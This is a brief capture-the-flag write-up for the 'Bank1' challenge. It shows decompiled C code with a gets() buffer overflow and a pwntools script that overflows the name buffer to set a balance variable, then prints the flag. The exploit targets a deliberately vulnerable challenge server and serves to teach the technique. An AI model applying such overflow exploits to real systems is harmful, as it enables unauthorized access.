# **Bank1**

Pseudo code from IDA:

```c++
void getFlag()
{
  system("cat flag.txt");
}
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
  if ( balance )
    getFlag();
}
```

This is even easier than HPBD since we just need to overwrite `balance`. Exploit the vulnerable gets function with buffer overflow and we can get to the flag.

The exploit code:

```python
from pwn import *

r = remote("61.28.237.24", 30202)

r.recvuntil('[+] Please enter your name: ')
payload= "A"*64+p32(0xCABBFEFF) #64 "A" to fill name[64] and I copied this from hpbd since I was lazy xD(random characters is good enough)
r.send(payload)
r.interactive()
#HCMUS-CTF{that_was_easy_xd}
```

[**Turn Back**](README.md)